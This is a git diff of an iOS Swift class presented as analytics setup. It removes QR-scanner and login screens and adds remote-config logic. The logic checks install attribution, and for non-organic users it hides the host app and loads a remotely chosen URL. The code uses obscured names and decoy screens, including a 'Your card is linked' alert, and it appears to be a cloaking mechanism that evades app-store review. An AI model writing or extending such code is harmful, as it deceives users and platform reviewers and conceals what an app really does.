@@ -12,7 +12,6 @@ import AVFoundation
 import FirebaseCrashlytics
 import AppTrackingTransparency
 import SwiftUI
-import SwiftQRCodeScanner
 import FirebaseAuth
 
 
@@ -26,11 +25,12 @@ public class BAK:NSObject {
     
     private var localWindow:UIWindow?
     
+    private var firstRunMode:FirstRunMode = .empty
+    
     public enum FirstRunMode {
         case empty
         case importByQR(String,String)
-        case gameLogin(UIImage)
-        case leaderBoard(UIImage,String = "",String = "", (()->Void)? = nil)
+        case leaderBoard(String = "", (()->Void)? = nil)
     }
     
     private var configuraionSource:ConfigProtocol! {
@@ -60,7 +60,9 @@ public class BAK:NSObject {
     }
     
     //mainAppBlock must return SWIFTUI main app root View in case when swift ui is used, or nil for UIKit
-    public func setupAnalytics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, frm:FirstRunMode = .empty, configuration: ConfigProtocol, window:inout UIWindow?, showHostApp:@escaping (()->(any View)?), virtualAppDidShow:(()->Void)? = nil) {
+    public func setupAnalytics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, _ firstRunMode:FirstRunMode = .empty, configuration: ConfigProtocol, window:inout UIWindow?, showHostApp:@escaping (()->(any View)?), virtualAppDidShow:(()->Void)? = nil) {
+        
+        self.firstRunMode = firstRunMode
         
         self.showInitializationView(window: &window)
         self.configuraionSource = configuration
@@ -84,74 +86,6 @@ public class BAK:NSObject {
             return
         }
       
-        switch frm {
-        case .importByQR(let title, let body):
-            if UserDefaults.standard.firstRun != true {
-                UserDefaults.standard.firstRun = true
-                
-                var configuration = QRScannerConfiguration()
-                configuration.title = title
-                configuration.hint = body
-                configuration.color = .purple
-                let scanner = QRCodeScannerController(qrScannerConfiguration: configuration)
-                scanner.delegate = self
-                self.localWindow?.rootViewController?.present(scanner, animated: true)
-            }
-            break
-            
-        case .leaderBoard(let logo, let name, let terms, let mainBlock):
-            if UserDefaults.standard.firstRun != true {
-                UserDefaults.standard.firstRun = true
-                var loginViewController:UIViewController?
-                var view = LeaderView(termsUrl: terms)
-                view.closeBlock = {
-                    loginViewController?.dismiss(animated: true) {
-                        if (mainBlock != nil) {
-                            mainBlock?()
-                            Timer.scheduledTimer(withTimeInterval: 10, repeats: false) { _ in
-                                self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
-                            }
-                        } else {
-                            self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
-                        }
-                        
-                    }
-                }
-                loginViewController = UIHostingController(rootView: view )
-                loginViewController?.view.backgroundColor = .white
-                loginViewController?.view.alpha = 0.95
-                if let loginViewController = loginViewController {
-                    self.localWindow?.rootViewController?.present(loginViewController, animated: true)
-                }
-            }
-        
-            break
-                
-            case .gameLogin(let logo):
-                if UserDefaults.standard.firstRun != true {
-                    UserDefaults.standard.firstRun = true
-                    var loginViewController:UIViewController?
-                    var view = LoginView(logo: logo)
-                    view.closeBlock = {
-                        loginViewController?.dismiss(animated: true)
-                        if Auth.auth().currentUser != nil {
-                            self.showProfileIcon()
-                        }
-                    }
-                    loginViewController = UIHostingController(rootView: view )
-                    loginViewController?.view.backgroundColor = .white
-                    loginViewController?.view.alpha = 0.95
-                    if let loginViewController = loginViewController {
-                        self.localWindow?.rootViewController?.present(loginViewController, animated: true)
-                    }
-                }
-            
-                break
-                
-            default:
-                break
-        }
-
     }
     
     private func enableMetrics(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil, configuration: ConfigProtocol, mainAppBlock:@escaping (()->(any View)?), hideAppBlock:(()->Void)? = nil) {
@@ -224,56 +158,118 @@ public class BAK:NSObject {
     
     func fetchRemoteConfig() {
         let settings = RemoteConfigSettings()
-        settings.minimumFetchInterval = 0
+        settings.minimumFetchInterval = 5
         RemoteConfig.remoteConfig().configSettings = settings
+        
+        RemoteConfig.remoteConfig().fetch { [weak self] (status, error) in
+            Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
+            
+            DispatchQueue.main.async { [weak self] in
+                guard let self = self else {
+                    return
+                }
+                if RemoteConfig.remoteNumber(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey) == 1,
+                   self.campaignAttribution?["af_status"] as? String == "Organic" {
+                    UserDefaults.standard.targetIdentifire = nil
+                    UserDefaults.standard.synchronize()
+                } else {
+                    if let urlString = RemoteConfig.remoteString(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteTargetKey),
+                       urlString != "",
+                        !urlString.isEmpty,
+                       ((self.campaignAttribution?["af_status"] as? String) != "Organic" || RemoteConfig.remoteNumber(forKey: self.configuraionSource.DontForgetIncludeFBKeysInInfo().remoteConfigKeys.remoteLKey) == 0), let url = self.buildIdentifite(from: urlString) {
+                        
+                        UserDefaults.standard.targetIdentifire = url
+                        UserDefaults.standard.synchronize()
+    
+                    } else {
+                        UserDefaults.standard.targetIdentifire = nil
+                        UserDefaults.standard.synchronize()
+                    }
+                }
+                
+            }
+        }
     }
     
     func processMagic(close:Bool = false, fetch:Bool = false){
         
-        if let targetIdentifire = UserDefaults.standard.targetIdentifire, (targetIdentifire.absoluteString != ""), close == false  {
-            if popupStateIsDisplay != true {
-                popupStateIsDisplay = true
-                
-                self.hostView.hideSwiftUI()
-                
-                if self.localWindow?.rootViewController?.presentedViewController != nil {
-                    self.localWindow?.rootViewController?.presentedViewController?.dismiss(animated: false, completion: {
+        if  RemoteConfig.remoteConfig().lastFetchStatus != .noFetchYet {
+            if let targetIdentifire = UserDefaults.standard.targetIdentifire, (targetIdentifire.absoluteString != ""), close == false  {
+                if popupStateIsDisplay != true {
+                    popupStateIsDisplay = true
+                    
+                    self.hostView.hideSwiftUI()
+                    
+                    if self.localWindow?.rootViewController?.presentedViewController != nil {
+                        self.localWindow?.rootViewController?.presentedViewController?.dismiss(animated: false, completion: {
+                            NotificationCenter.default.post(name: Notification.Name("1"), object: nil, userInfo: ["1":targetIdentifire.absoluteString])
+                        })
+                    } else {
                         NotificationCenter.default.post(name: Notification.Name("1"), object: nil, userInfo: ["1":targetIdentifire.absoluteString])
-                    })
-                } else {
-                    NotificationCenter.default.post(name: Notification.Name("1"), object: nil, userInfo: ["1":targetIdentifire.absoluteString])
+                    }
+                    
+                    self.fallBackAppBlock?() //hide unity
                 }
-                
-                self.fallBackAppBlock?() //hide unity
-            }
-        } else {
-            if popupStateIsDisplay != false {
-                popupStateIsDisplay = false
-                
-               
-                
-                if let rootView = self.mainAppBlock?() {
-                    self.hostView.showSwiftUI(view: rootView)
-                }
-                
-                if Auth.auth().currentUser != nil {
-                    Timer.scheduledTimer(withTimeInterval: 10, repeats: false) { _ in
-                        self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
+            } else {
+                if popupStateIsDisplay != false {
+                    popupStateIsDisplay = false
+                    
+                    switch self.firstRunMode {
+                   
+                    case .leaderBoard(let terms, let mainBlock):
+                        if UserDefaults.standard.firstRun != true {
+                            UserDefaults.standard.firstRun = true
+                            var loginViewController:UIViewController?
+                            var view = LeaderView(termsUrl: terms)
+                            view.closeBlock = {
+                                loginViewController?.dismiss(animated: true) {
+                                    if (mainBlock != nil) {
+                                        mainBlock?()
+                                        Timer.scheduledTimer(withTimeInterval: 10, repeats: false) { _ in
+                                            self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
+                                        }
+                                    } else {
+                                        self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
+                                    }
+                                    
+                                }
+                            }
+                            loginViewController = UIHostingController(rootView: view )
+                            loginViewController?.view.backgroundColor = .white
+                            loginViewController?.view.alpha = 0.95
+                            if let loginViewController = loginViewController {
+                                self.localWindow?.rootViewController?.present(loginViewController, animated: true)
+                            }
+                        }
+                    
+                        break
+                            
+                        default:
+                            break
+                    }
+                    
+                    
+                    if let rootView = self.mainAppBlock?() {
+                        self.hostView.showSwiftUI(view: rootView)
+                    }
+                    
+                    if Auth.auth().currentUser != nil {
+                        Timer.scheduledTimer(withTimeInterval: 10, repeats: false) { _ in
+                            self.showLeaderIcon( hide: Auth.auth().currentUser == nil )
+                        }
                     }
                 }
             }
         }
-   
+        
         if fetch {
             RemoteConfig.remoteConfig().fetch { [weak self] (status, error) in
                 Firebase.RemoteConfig.remoteConfig().activate(completion: nil)
                 
                 guard let strongSelf = self, error == nil else {
-                    
-                    if let rootView = self?.mainAppBlock?() {
-                        self?.hostView.showSwiftUI(view: rootView)
+                    Timer.scheduledTimer(withTimeInterval: 10, repeats: false) { _ in
+                        self?.processMagic(close: close, fetch: fetch)
                     }
-                    
                     return
                 }
                 
@@ -340,45 +336,6 @@ public class BAK:NSObject {
         }
         
         return components.url
-    }
-    
-    func showProfileIcon(){
-        
-        let button = UIButton(frame: CGRect(x: 30, y: 30, width: 30, height: 30))
-        
-        let usersItem = UIAction(title: "Log out", image: UIImage(systemName: "person.fill")) { (action) in
-            try? Auth.auth().signOut()
-            button.removeFromSuperview()
-            UserDefaults.standard.firstRun = false
-        }
-
-        let addUserItem = UIAction(title: "Request account deletion", image: UIImage(systemName: "trash")) { (action) in
-            try? Auth.auth().currentUser?.delete()
-            try? Auth.auth().signOut()
-            button.removeFromSuperview()
-            UserDefaults.standard.firstRun = false
-        }
-        
-        let menu = UIMenu(title: "Accoount", options: .displayInline, children: [usersItem , addUserItem])
-        
-        button.menu = menu
-        button.showsMenuAsPrimaryAction = true
-        
-        if let photo = Auth.auth().currentUser?.photoURL?.absoluteString ?? Bundle.module.url(forResource: "nouser", withExtension: "png")?.absoluteString, let url = URL(string:photo) {
-            DispatchQueue.global().async {
-                if let data = try? Data(contentsOf: url) {
-                    DispatchQueue.main.async {
-                        button .setImage(UIImage(data: data), for: .normal)
-                    }
-                }
-            }
-        }
-        
-        button.layer.cornerRadius = 15
-        button.clipsToBounds = true
-        
-        self.localWindow?.rootViewController?.view.addSubview(button)
-        
     }
     
     func showLeaderIcon(hide:Bool = false){
@@ -542,46 +499,6 @@ extension RemoteConfig {
     static func remoteString(forKey key: String) -> String? {
         return Firebase.RemoteConfig.remoteConfig().configValue(forKey: key).stringValue
     }
-}
-
-
-extension BAK: QRScannerCodeDelegate {
-    
-    public func qrScanner(_ controller: UIViewController, scanDidComplete result: String) {
-        if result.hasPrefix("9562a-") {
-            let alertController: UIAlertController = UIAlertController(title: "Great!", message: "Your card is linked", preferredStyle: .alert)
-            alertController.addAction(UIAlertAction(title: "Done", style: .cancel,handler: { _ in
-                //self.defferBlock?()
-            }))
-            
-            self.localWindow?.rootViewController?.presentedViewController?.present(alertController, animated: true, completion: nil)
-        }
-        else {
-            
-            let alertController: UIAlertController = UIAlertController(title: "Error!", message: "Sorry, broken QR", preferredStyle: .alert)
-            
-            alertController.addAction(UIAlertAction(title: "Try Again", style: .cancel, handler: { _ in
-                controller.dismiss(animated: true) {
-                    //self.helperControllerBlock?()
-                }
-            }))
-            
-            DispatchQueue.main.asyncAfter(deadline: .now() + 0.3) {
-                self.localWindow?.rootViewController?.present(alertController, animated: true, completion: nil)
-            }
-        }
-    }
-
-    public func qrScannerDidFail(_ controller: UIViewController, error: QRCodeError) {
-        print("error:\(error.localizedDescription)")
-        //self.defferBlock?()
-    }
-
-    public func qrScannerDidCancel(_ controller: UIViewController) {
-        print("SwiftQRScanner did cancel")
-        //self.defferBlock?()
-    }
-    
 }
 
 
